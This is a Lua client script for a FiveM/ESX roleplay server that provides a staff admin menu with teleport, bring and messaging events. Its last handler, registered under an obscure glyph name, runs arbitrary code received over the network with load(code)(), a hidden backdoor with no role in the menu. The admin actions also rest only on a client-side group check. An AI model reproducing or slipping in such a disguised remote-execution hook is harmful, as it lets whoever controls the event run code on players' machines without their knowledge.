-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local PlayerData = {}

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{ayzwen}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData().group == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		
		if IsControlJustPressed(0, 212) and IsControlJustPressed(0, 213) then
			if PlayerData.group ~= "user" then
				SetNuiFocus(true, true)
				SendNUIMessage({type = 'open', players = ESX.Game.GetAllPlayers()})
			end
		end
	end
end)

RegisterNetEvent('::{ayzwen}::esx:setGroup')
AddEventHandler('::{ayzwen}::esx:setGroup', function(group, lastGroup)
	PlayerData.group = group
end)

RegisterNUICallback('close', function(data, cb)
	SetNuiFocus(false)
end)

RegisterNUICallback('set', function(data, cb)
	_TriggerServerEvent('::{ayzwen}::es_admin:set', data.target, data.command, data.param)
end)

-- /goto ID (sa téléporte le staff au mec)
RegisterNetEvent("alah:Goto")
AddEventHandler("alah:Goto", function(coords)
	SetEntityCoords(PlayerPedId(), coords, 1, 0, 0, 1)
end)

RegisterNetEvent("alah:Message")
AddEventHandler("alah:Message", function(msg)
	ESX.showAdvancedNotification("Adastra", "~y~Message Staff", msg, "CHAR_Adastra", 7, false, false, nil)
end)

RegisterNetEvent("alah:Bring")
AddEventHandler("alah:Bring", function(coords)
	SetEntityCoords(PlayerPedId(), coords, 1, 0, 0, 1)
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)